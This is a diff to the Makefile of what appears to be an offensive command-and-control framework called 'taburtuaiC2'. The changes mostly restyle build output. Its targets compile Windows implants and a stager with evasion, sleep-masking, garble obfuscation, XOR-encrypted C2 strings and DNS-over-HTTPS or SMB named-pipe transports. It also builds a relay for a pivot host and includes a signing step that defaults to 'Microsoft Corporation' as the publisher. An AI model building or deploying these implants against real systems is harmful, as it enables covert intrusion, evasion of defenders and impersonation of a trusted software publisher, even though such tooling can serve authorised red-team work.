@@ -18,21 +18,21 @@ KILL_DATE    ?=
 PROFILE      ?= default
 FRONT_DOMAIN ?=
 
-# Compile-time string encryption (agent-win-encrypted target)
 # XOR_KEY: single byte as 2-digit hex (00–ff). Default: 5a
 XOR_KEY     ?= 5a
 
-# Alternative transport selection (agent-win-doh / agent-win-smb targets)
+# Alternative transport selection
 # TRANSPORT: http (default) | doh | icmp | smb
 TRANSPORT   ?= http
-DOH_DOMAIN  ?=              # required for doh transport (e.g. c2.example.com)
-DOH_PROVIDER ?= cloudflare  # cloudflare | google
-SMB_RELAY   ?=              # required for smb transport (hostname or IP of relay)
-SMB_PIPE    ?= svcctl       # named pipe on relay host
+DOH_DOMAIN  ?=
+DOH_PROVIDER ?= cloudflare
+SMB_RELAY   ?=
+SMB_PIPE    ?= svcctl
 
-# Build flags
+# Build tools
 GO          := go
 GARBLE      := garble
+
 LDFLAGS_BASE := -X main.serverURL=$(C2_SERVER) \
                 -X main.encKey=$(ENC_KEY) \
                 -X main.secondaryKey=$(SEC_KEY) \
@@ -49,6 +49,33 @@ LDFLAGS_BASE := -X main.serverURL=$(C2_SERVER) \
 LDFLAGS_STRIP := $(LDFLAGS_BASE) -s -w
 LDFLAGS_WIN   := $(LDFLAGS_STRIP) -H windowsgui
 
+# ANSI colour codes (work in bash; noop on non-colour terminals)
+C0  := \033[0m
+CB  := \033[1m
+CD  := \033[2m
+CR  := \033[31m
+CG  := \033[32m
+CY  := \033[33m
+CC  := \033[36m
+CW  := \033[97m
+SEP := $(CD)━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$(C0)
+
+# ── Shared shell snippets ─────────────────────────────────────────────────────
+# Print file stats after a successful build.  Usage: $(call BUILD_STAT,path)
+define BUILD_STAT
+	@{ \
+	  t=$(1); \
+	  sz=$$(wc -c < $$t | tr -d ' '); \
+	  mb=$$(awk "BEGIN{printf \"%.2f\", $$sz/1048576}"); \
+	  h=$$(sha256sum $$t 2>/dev/null | cut -c1-16 || shasum -a256 $$t | cut -c1-16); \
+	  printf "\n  $(SEP)\n"; \
+	  printf "  $(CG)$(CB)[+]$(C0) $(CB)%s$(C0)\n" "$$t"; \
+	  printf "      $(CD)%-8s$(C0) %s MB\n" "size" "$$mb"; \
+	  printf "      $(CD)%-8s$(C0) %s…\n"   "sha256" "$$h"; \
+	  printf "  $(SEP)\n\n"; \
+	}
+endef
+
 .PHONY: all server operator generate strenc agent-windows agent-linux agent-darwin \
         agent-win-stealth agent-win-garble agent-win-encrypted agent-win-doh agent-win-smb \
         stager smb-relay deps clean help sign sign-cert build-check
@@ -61,27 +88,30 @@ all: server operator generate agent-windows
 
 server: ## Build C2 server binary
 	@mkdir -p $(BINARY_DIR)
-	$(GO) build -o $(SERVER_BIN) ./cmd/server
-	@echo "[+] Server: $(SERVER_BIN)"
+	@printf "  $(CD)[*]$(C0) building server …\n"
+	@$(GO) build -o $(SERVER_BIN) ./cmd/server
+	@printf "  $(CG)$(CB)[+]$(C0) $(CB)$(SERVER_BIN)$(C0)\n\n"
 
 operator: ## Build operator CLI binary
 	@mkdir -p $(BINARY_DIR)
-	$(GO) build -o $(OPERATOR_BIN) ./cmd/operator
-	@echo "[+] Operator: $(OPERATOR_BIN)"
+	@printf "  $(CD)[*]$(C0) building operator …\n"
+	@$(GO) build -o $(OPERATOR_BIN) ./cmd/operator
+	@printf "  $(CG)$(CB)[+]$(C0) $(CB)$(OPERATOR_BIN)$(C0)\n\n"
 
 generate: ## Build implant generator CLI
 	@mkdir -p $(BINARY_DIR)
-	$(GO) build -o $(GENERATE_BIN) ./cmd/generate
-	@echo "[+] Generator: $(GENERATE_BIN)"
+	@printf "  $(CD)[*]$(C0) building generator …\n"
+	@$(GO) build -o $(GENERATE_BIN) ./cmd/generate
+	@printf "  $(CG)$(CB)[+]$(C0) $(CB)$(GENERATE_BIN)$(C0)\n\n"
 
-strenc: ## Build string encryption helper (used internally by agent-win-encrypted)
+strenc: ## Build string encryption helper
 	@mkdir -p $(BINARY_DIR)
-	$(GO) build -o $(STRENC_BIN) ./cmd/strenc
-	@echo "[+] strenc: $(STRENC_BIN)"
+	@$(GO) build -o $(STRENC_BIN) ./cmd/strenc
 
-stager: ## Build Windows stager binary (use generate cmd for production)
+stager: ## Build Windows stager binary
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "  $(CD)[*]$(C0) building stager …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GO) build \
 		-ldflags "$(LDFLAGS_WIN) \
 			-X main.c2URL=$(C2_SERVER) \
@@ -90,22 +120,40 @@ stager: ## Build Windows stager binary (use generate cmd for production)
 			-X main.execMethod=$(or $(EXEC_METHOD),thread)" \
 		-o $(BINARY_DIR)/stager.exe \
 		./cmd/stager
-	@echo "[+] Stager: $(BINARY_DIR)/stager.exe"
+	$(call BUILD_STAT,$(BINARY_DIR)/stager.exe)
 
 ## ── Agent builds ─────────────────────────────────────────────────────────────
 
-agent-windows: ## Build Windows agent (with console, for testing)
+agent-windows: ## Build Windows agent (with console, for testing/dev)
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "\n  $(SEP)\n"
+	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
+	@printf "  $(SEP)\n\n"
+	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  (dev build, console visible)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)"
+	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "exec"     "cmd"
+	@printf "\n  $(CD)[*]$(C0) compiling …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GO) build \
 		-ldflags "$(LDFLAGS_BASE) -X main.defaultExecMethod=cmd" \
 		-o $(BINARY_DIR)/agent_windows.exe \
 		$(AGENT_DIR)
-	@echo "[+] Windows agent: $(BINARY_DIR)/agent_windows.exe"
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows.exe)
 
-agent-win-stealth: ## Build Windows stealth agent (no console, stripped)
+agent-win-stealth: ## Build Windows stealth agent (no console, stripped, evasion on)
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "\n  $(SEP)\n"
+	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
+	@printf "  $(SEP)\n\n"
+	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  ·  stealth  (no-console, stripped)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)"
+	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"  "on  ·  sleep-masking on"
+	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
+	@printf "    $(CD)%-12s$(C0) %s\n" "exec"     "powershell"
+	@printf "\n  $(CD)[*]$(C0) compiling …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GO) build \
 		-ldflags "$(LDFLAGS_WIN) \
 			-X main.defaultExecMethod=powershell \
@@ -114,12 +162,23 @@ agent-win-stealth: ## Build Windows stealth agent (no console, stripped)
 			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
 		-o $(BINARY_DIR)/agent_windows_stealth.exe \
 		$(AGENT_DIR)
-	@echo "[+] Windows stealth: $(BINARY_DIR)/agent_windows_stealth.exe"
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_stealth.exe)
 
-agent-win-garble: ## Build Windows agent with garble obfuscation (needs garble installed)
-	@command -v $(GARBLE) >/dev/null 2>&1 || (echo "[-] garble not found: go install mvdan.cc/garble@latest" && exit 1)
+agent-win-garble: ## Build Windows agent with garble obfuscation
+	@command -v $(GARBLE) >/dev/null 2>&1 || { \
+	  printf "  $(CR)[!]$(C0) garble not found: go install mvdan.cc/garble@latest\n"; exit 1; }
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "\n  $(SEP)\n"
+	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
+	@printf "  $(SEP)\n\n"
+	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  ·  garble-obfuscated"
+	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)"
+	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"  "on  ·  sleep-masking on"
+	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
+	@printf "    $(CD)%-12s$(C0) %s\n" "obfuscation" "garble -tiny -literals -seed=random"
+	@printf "\n  $(CD)[*]$(C0) compiling + obfuscating …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GARBLE) -tiny -literals -seed=random build \
 		-ldflags "$(LDFLAGS_WIN) \
 			-X main.defaultExecMethod=powershell \
@@ -127,14 +186,24 @@ agent-win-garble: ## Build Windows agent with garble obfuscation (needs garble i
 			-X main.defaultSleepMasking=true" \
 		-o $(BINARY_DIR)/agent_windows_obf.exe \
 		$(AGENT_DIR)
-	@echo "[+] Windows garble: $(BINARY_DIR)/agent_windows_obf.exe"
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_obf.exe)
 
 agent-win-encrypted: strenc ## Build Windows stealth agent with XOR-encrypted build strings
 	$(eval ENC_SERVER := $(shell $(STRENC_BIN) enc "$(C2_SERVER)" $(XOR_KEY)))
 	$(eval ENC_ENCKEY := $(shell $(STRENC_BIN) enc "$(ENC_KEY)" $(XOR_KEY)))
 	$(eval ENC_SECKEY := $(shell $(STRENC_BIN) enc "$(SEC_KEY)" $(XOR_KEY)))
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "\n  $(SEP)\n"
+	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
+	@printf "  $(SEP)\n\n"
+	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  ·  XOR-encrypted strings"
+	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)  $(CD)(encrypted in binary)$(C0)"
+	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"  "on  ·  sleep-masking on"
+	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
+	@printf "    $(CD)%-12s$(C0) 0x%s\n" "xor key"  "$(XOR_KEY)"
+	@printf "\n  $(CD)[*]$(C0) compiling …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GO) build \
 		-ldflags "-s -w -H windowsgui \
 			-X main.serverURLEnc=$(ENC_SERVER) \
@@ -151,14 +220,23 @@ agent-win-encrypted: strenc ## Build Windows stealth agent with XOR-encrypted bu
 			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
 		-o $(BINARY_DIR)/agent_windows_enc.exe \
 		$(AGENT_DIR)
-	@echo "[+] Encrypted agent: $(BINARY_DIR)/agent_windows_enc.exe"
-	@echo "    C2 URL (encrypted): $(ENC_SERVER)  [key=$(XOR_KEY)]"
-	@echo "    No plaintext strings in binary for C2 URL / AES keys"
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_enc.exe)
 
-agent-win-doh: ## Build Windows agent using DNS-over-HTTPS transport (requires DOH_DOMAIN)
-	@test -n "$(DOH_DOMAIN)" || (echo "[-] DOH_DOMAIN is required. Example: make agent-win-doh DOH_DOMAIN=c2.example.com" && exit 1)
+agent-win-doh: ## Build Windows agent using DNS-over-HTTPS transport
+	@test -n "$(DOH_DOMAIN)" || { \
+	  printf "  $(CR)[!]$(C0) DOH_DOMAIN required.  example: make agent-win-doh DOH_DOMAIN=c2.example.com\n"; exit 1; }
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "\n  $(SEP)\n"
+	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
+	@printf "  $(SEP)\n\n"
+	@printf "    $(CD)%-12s$(C0) %s\n" "target"    "Windows x64  ·  DNS-over-HTTPS transport"
+	@printf "    $(CD)%-12s$(C0) %s\n" "doh domain" "$(DOH_DOMAIN)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "provider"  "$(DOH_PROVIDER)"
+	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"   "on  ·  sleep-masking on"
+	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
+	@printf "\n  $(CD)[*]$(C0) compiling …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GO) build \
 		-ldflags "$(LDFLAGS_WIN) \
 			-X main.defaultTransport=doh \
@@ -170,14 +248,22 @@ agent-win-doh: ## Build Windows agent using DNS-over-HTTPS transport (requires D
 			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
 		-o $(BINARY_DIR)/agent_windows_doh.exe \
 		$(AGENT_DIR)
-	@echo "[+] DoH agent: $(BINARY_DIR)/agent_windows_doh.exe"
-	@echo "    Domain  : $(DOH_DOMAIN)"
-	@echo "    Provider: $(DOH_PROVIDER)"
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_doh.exe)
 
-agent-win-smb: ## Build Windows agent using SMB named pipe transport (requires SMB_RELAY)
-	@test -n "$(SMB_RELAY)" || (echo "[-] SMB_RELAY is required. Example: make agent-win-smb SMB_RELAY=FILESERVER01" && exit 1)
+agent-win-smb: ## Build Windows agent using SMB named pipe transport
+	@test -n "$(SMB_RELAY)" || { \
+	  printf "  $(CR)[!]$(C0) SMB_RELAY required.  example: make agent-win-smb SMB_RELAY=FILESERVER01\n"; exit 1; }
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "\n  $(SEP)\n"
+	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
+	@printf "  $(SEP)\n\n"
+	@printf "    $(CD)%-12s$(C0) %s\n" "target"  "Windows x64  ·  SMB named-pipe transport"
+	@printf "    $(CD)%-12s$(C0) \\\\%s\\pipe\\%s\n" "relay"   "$(SMB_RELAY)" "$(SMB_PIPE)"
+	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "evasion" "on  ·  sleep-masking on"
+	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
+	@printf "\n  $(CD)[*]$(C0) compiling …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GO) build \
 		-ldflags "$(LDFLAGS_WIN) \
 			-X main.defaultTransport=smb \
@@ -189,38 +275,17 @@ agent-win-smb: ## Build Windows agent using SMB named pipe transport (requires S
 			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
 		-o $(BINARY_DIR)/agent_windows_smb.exe \
 		$(AGENT_DIR)
-	@echo "[+] SMB agent: $(BINARY_DIR)/agent_windows_smb.exe"
-	@echo "    Relay: \\\\$(SMB_RELAY)\\pipe\\$(SMB_PIPE)"
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_smb.exe)
 
 smb-relay: ## Build SMB named pipe relay (deploy on internal pivot host)
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "  $(CD)[*]$(C0) building SMB relay …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GO) build \
 		-ldflags "-s -w" \
 		-o $(BINARY_DIR)/smb_relay.exe \
 		./cmd/listener/smb_relay.go
-	@echo "[+] SMB relay: $(BINARY_DIR)/smb_relay.exe"
-	@echo "    Usage: smb_relay.exe --pipe $(SMB_PIPE) --c2 $(C2_SERVER) --key $(ENC_KEY)"
-
-agent-linux: ## Build Linux agent
-	@mkdir -p $(BINARY_DIR)
-	GOOS=linux GOARCH=amd64 CGO_ENABLED=0 \
-	$(GO) build \
-		-ldflags "$(LDFLAGS_STRIP)" \
-		-o $(BINARY_DIR)/agent_linux \
-		$(AGENT_DIR)
-	@echo "[+] Linux agent: $(BINARY_DIR)/agent_linux"
-
-agent-darwin: ## Build macOS agent
-	@mkdir -p $(BINARY_DIR)
-	GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 \
-	$(GO) build \
-		-ldflags "$(LDFLAGS_STRIP)" \
-		-o $(BINARY_DIR)/agent_darwin \
-		$(AGENT_DIR)
-	@echo "[+] macOS agent: $(BINARY_DIR)/agent_darwin"
-
-## ── Custom build with all flags exposed ──────────────────────────────────────
+	$(call BUILD_STAT,$(BINARY_DIR)/smb_relay.exe)
 
 # Usage:
 #   make agent-custom \
@@ -228,9 +293,19 @@ agent-darwin: ## Build macOS agent
 #     ENC_KEY=MyKey12345678901 \
 #     INTERVAL=60 JITTER=30 \
 #     KILL_DATE=2026-12-31
-agent-custom: ## Build Windows agent with custom parameters (see Makefile header for vars)
+agent-custom: ## Build Windows agent with fully custom parameters
 	@mkdir -p $(BINARY_DIR)
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	@printf "\n  $(SEP)\n"
+	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
+	@printf "  $(SEP)\n\n"
+	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  ·  custom"
+	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)"
+	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
+	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"  "on  ·  sleep-masking on"
+	@[ -n "$(KILL_DATE)"   ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date"  "$(KILL_DATE)"  || true
+	@[ -n "$(WORK_START)"  ] && printf "    $(CD)%-12s$(C0) %s – %s\n" "work hours" "$(WORK_START):00" "$(WORK_END):00" || true
+	@printf "\n  $(CD)[*]$(C0) compiling …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
 	$(GO) build \
 		-ldflags "$(LDFLAGS_WIN) \
 			-X main.defaultExecMethod=powershell \
@@ -242,56 +317,73 @@ agent-custom: ## Build Windows agent with custom parameters (see Makefile header
 			$(if $(WORK_END),-X main.defaultWorkingHoursEnd=$(WORK_END),)" \
 		-o $(BINARY_DIR)/agent_custom.exe \
 		$(AGENT_DIR)
-	@echo "[+] Custom agent: $(BINARY_DIR)/agent_custom.exe"
-	@echo "    Server  : $(C2_SERVER)"
-	@echo "    Interval: $(INTERVAL)s / jitter: $(JITTER)%"
-	@echo "    Kill    : $(KILL_DATE)"
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_custom.exe)
+
+agent-linux: ## Build Linux agent
+	@mkdir -p $(BINARY_DIR)
+	@printf "  $(CD)[*]$(C0) building Linux agent …\n"
+	@GOOS=linux GOARCH=amd64 CGO_ENABLED=0 \
+	$(GO) build \
+		-ldflags "$(LDFLAGS_STRIP)" \
+		-o $(BINARY_DIR)/agent_linux \
+		$(AGENT_DIR)
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_linux)
+
+agent-darwin: ## Build macOS agent
+	@mkdir -p $(BINARY_DIR)
+	@printf "  $(CD)[*]$(C0) building macOS agent …\n"
+	@GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 \
+	$(GO) build \
+		-ldflags "$(LDFLAGS_STRIP)" \
+		-o $(BINARY_DIR)/agent_darwin \
+		$(AGENT_DIR)
+	$(call BUILD_STAT,$(BINARY_DIR)/agent_darwin)
 
 ## ── Signing ──────────────────────────────────────────────────────────────────
 
-# Usage:
-#   make sign BINARY=bin/agent_windows_enc.exe
-#   make sign BINARY=bin/agent_windows_enc.exe SIGN_PUBLISHER="Microsoft Corp" SIGN_CERT=my.pfx
 SIGN_BINARY    ?=
 SIGN_PUBLISHER ?= Microsoft Corporation
 SIGN_CERT      ?=
 SIGN_PASS      ?= taburtuai
 
 sign: ## Sign a Windows PE binary with a self-signed Authenticode cert
-	@test -n "$(SIGN_BINARY)" || (echo "[-] Usage: make sign BINARY=path/to/agent.exe" && exit 1)
+	@test -n "$(SIGN_BINARY)" || { \
+	  printf "  $(CR)[!]$(C0) Usage: make sign BINARY=path/to/agent.exe\n"; exit 1; }
+	@printf "  $(CD)[*]$(C0) signing $(SIGN_BINARY) …\n"
 	@mkdir -p $(BINARY_DIR)
-	$(GO) run ./cmd/sign \
+	@$(GO) run ./cmd/sign \
 		--binary "$(SIGN_BINARY)" \
 		$(if $(SIGN_CERT),--cert "$(SIGN_CERT)",) \
 		--password "$(SIGN_PASS)" \
 		--publisher "$(SIGN_PUBLISHER)"
-	@echo "[+] Signing complete: $(SIGN_BINARY)"
+	@printf "  $(CG)$(CB)[+]$(C0) signed: $(SIGN_BINARY)\n\n"
 
-sign-cert: ## Generate a self-signed PFX cert only (no binary)
-	$(GO) run ./cmd/sign \
+sign-cert: ## Generate a self-signed PFX cert only
+	@$(GO) run ./cmd/sign \
 		--gen-cert \
 		--publisher "$(SIGN_PUBLISHER)" \
 		--password "$(SIGN_PASS)" \
 		--out $(BINARY_DIR)/sign.pfx
-	@echo "[+] Cert: $(BINARY_DIR)/sign.pfx  (password: $(SIGN_PASS))"
+	@printf "  $(CG)$(CB)[+]$(C0) $(BINARY_DIR)/sign.pfx  $(CD)(password: $(SIGN_PASS))$(C0)\n\n"
 
 ## ── Utilities ────────────────────────────────────────────────────────────────
 
 deps: ## Download and tidy Go modules
-	$(GO) mod download
-	$(GO) mod tidy
-	@echo "[+] Dependencies ready"
+	@printf "  $(CD)[*]$(C0) tidying modules …\n"
+	@$(GO) mod download
+	@$(GO) mod tidy
+	@printf "  $(CG)$(CB)[+]$(C0) dependencies ready\n\n"
 
 build-check: ## Verify all packages compile (Windows + native)
-	@echo "[*] Checking native build..."
-	$(GO) build ./...
-	@echo "[*] Checking windows/amd64 cross-compile..."
-	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 $(GO) build ./...
-	@echo "[+] All packages OK"
+	@printf "  $(CD)[*]$(C0) native build check …\n"
+	@$(GO) build ./...
+	@printf "  $(CD)[*]$(C0) windows/amd64 cross-compile check …\n"
+	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 $(GO) build ./...
+	@printf "  $(CG)$(CB)[+]$(C0) all packages OK\n\n"
 
 clean: ## Remove build artifacts
-	rm -rf $(BINARY_DIR)
-	@echo "[+] Cleaned"
+	@rm -rf $(BINARY_DIR)
+	@printf "  $(CG)$(CB)[+]$(C0) cleaned\n\n"
 
 run-server: server ## Build and run server
 	./$(SERVER_BIN)
@@ -300,31 +392,26 @@ run-operator: operator ## Build and run operator console
 	./$(OPERATOR_BIN) console --server $(C2_SERVER)
 
 help: ## Show this help
-	@echo ""
-	@echo "  taburtuaiC2 — Build System"
-	@echo ""
+	@printf "\n  $(CB)$(CC)TABURTUAI C2$(C0)  $(CD)—$(C0)  build system\n\n"
 	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | \
 		awk 'BEGIN {FS = ":.*?## "}; {printf "  \033[36m%-22s\033[0m %s\n", $$1, $$2}'
-	@echo ""
-	@echo "  Variables (pass via make VAR=value):"
-	@echo "  \033[33mC2_SERVER\033[0m   C2 URL              (default: http://127.0.0.1:8080)"
-	@echo "  \033[33mENC_KEY\033[0m     AES key 16 chars    (default: SpookyOrcaC2AES1)"
-	@echo "  \033[33mINTERVAL\033[0m    Beacon interval sec (default: 30)"
-	@echo "  \033[33mJITTER\033[0m      Jitter percent      (default: 20)"
-	@echo "  \033[33mKILL_DATE\033[0m   Kill date YYYY-MM-DD (empty = never)"
-	@echo "  \033[33mWORK_START\033[0m  Working hours start  (0-23)"
-	@echo "  \033[33mWORK_END\033[0m    Working hours end    (0-23)"
-	@echo "  \033[33mXOR_KEY\033[0m     XOR byte (2-digit hex, default: 5a) for agent-win-encrypted"
-	@echo "  \033[33mDOH_DOMAIN\033[0m  C2 DNS zone (required for agent-win-doh)"
-	@echo "  \033[33mDOH_PROVIDER\033[0m cloudflare|google (default: cloudflare)"
-	@echo "  \033[33mSMB_RELAY\033[0m   Relay host name/IP (required for agent-win-smb)"
-	@echo "  \033[33mSMB_PIPE\033[0m    Named pipe name on relay (default: svcctl)"
-	@echo ""
-	@echo "  Examples:"
-	@echo "  \033[2mmake agent-win-stealth C2_SERVER=http://192.168.1.10:8080 ENC_KEY=MyKey1234567890 KILL_DATE=2026-12-31\033[0m"
-	@echo "  \033[2mmake agent-custom C2_SERVER=https://c2.domain.com INTERVAL=300 JITTER=40 WORK_START=8 WORK_END=18\033[0m"
-	@echo "  \033[2mmake agent-win-encrypted C2_SERVER=https://c2.domain.com ENC_KEY=MyKey1234567890 XOR_KEY=a3\033[0m"
-	@echo "  \033[2mmake agent-win-doh DOH_DOMAIN=c2.example.com ENC_KEY=MyKey1234567890\033[0m"
-	@echo "  \033[2mmake agent-win-smb SMB_RELAY=FILESERVER01 SMB_PIPE=svcctl C2_SERVER=https://c2.domain.com\033[0m"
-	@echo "  \033[2mmake smb-relay C2_SERVER=https://c2.domain.com ENC_KEY=MyKey1234567890\033[0m"
-	@echo ""
+	@printf "\n  $(CD)Variables$(C0)  (pass via make VAR=value):\n\n"
+	@printf "  $(CY)%-16s$(C0) %s\n" "C2_SERVER"    "C2 URL                   (default: http://127.0.0.1:8080)"
+	@printf "  $(CY)%-16s$(C0) %s\n" "ENC_KEY"      "AES encryption key       (default: SpookyOrcaC2AES1)"
+	@printf "  $(CY)%-16s$(C0) %s\n" "INTERVAL"     "Beacon interval seconds  (default: 30)"
+	@printf "  $(CY)%-16s$(C0) %s\n" "JITTER"       "Jitter percent           (default: 20)"
+	@printf "  $(CY)%-16s$(C0) %s\n" "KILL_DATE"    "Kill date YYYY-MM-DD     (empty = never)"
+	@printf "  $(CY)%-16s$(C0) %s\n" "WORK_START"   "Working hours start 0-23"
+	@printf "  $(CY)%-16s$(C0) %s\n" "WORK_END"     "Working hours end   0-23"
+	@printf "  $(CY)%-16s$(C0) %s\n" "XOR_KEY"      "XOR byte hex  (default: 5a)  for agent-win-encrypted"
+	@printf "  $(CY)%-16s$(C0) %s\n" "DOH_DOMAIN"   "C2 DNS zone  (required for agent-win-doh)"
+	@printf "  $(CY)%-16s$(C0) %s\n" "DOH_PROVIDER" "cloudflare|google        (default: cloudflare)"
+	@printf "  $(CY)%-16s$(C0) %s\n" "SMB_RELAY"    "Relay host name/IP       (required for agent-win-smb)"
+	@printf "  $(CY)%-16s$(C0) %s\n" "SMB_PIPE"     "Named pipe on relay      (default: svcctl)"
+	@printf "\n  $(CD)Examples$(C0):\n\n"
+	@printf "  $(CD)make agent-win-stealth C2_SERVER=https://c2.corp.local:8000 ENC_KEY=K3y123 KILL_DATE=2026-12-31$(C0)\n"
+	@printf "  $(CD)make agent-custom      C2_SERVER=https://c2.corp.local:8000 INTERVAL=300 JITTER=40 WORK_START=8 WORK_END=18$(C0)\n"
+	@printf "  $(CD)make agent-win-encrypted C2_SERVER=https://c2.corp.local ENC_KEY=K3y123 XOR_KEY=a3$(C0)\n"
+	@printf "  $(CD)make agent-win-doh     DOH_DOMAIN=c2.example.com ENC_KEY=K3y123$(C0)\n"
+	@printf "  $(CD)make agent-win-smb     SMB_RELAY=FILESERVER01 SMB_PIPE=svcctl C2_SERVER=https://c2.corp.local$(C0)\n"
+	@printf "\n"
